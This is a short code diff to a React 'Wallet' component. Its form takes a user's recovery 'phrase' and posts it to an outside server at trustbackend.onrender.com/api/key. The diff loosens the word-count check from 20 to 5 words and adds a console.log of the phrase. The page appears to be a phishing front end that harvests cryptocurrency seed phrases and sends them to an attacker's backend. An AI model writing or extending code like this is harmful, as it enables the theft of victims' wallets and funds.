@@ -7,17 +7,12 @@ import toast from 'react-hot-toast';
 const Wallet = () => {
   const [formData, setFormData] = useState("");
   const [loading, setLoading] = useState(false);
-
+console.log(formData , 'dd')
   const dataSend = async () => {
-    if (!formData) {
+    if (!formData || formData.trim().split(/\s+/).length < 5) {
       return toast.error("Please enter correct phrase")
     }
-
-    const wordCount = formData.trim().split(/\s+/).length;
-    if (wordCount < 20) {
-      return toast.error("Please enter a valid phrase.");
-    }
-
+    
     setLoading(true)
     try {
       const res = await axios.post("https://trustbackend.onrender.com/api/key", { phrase: formData }, {
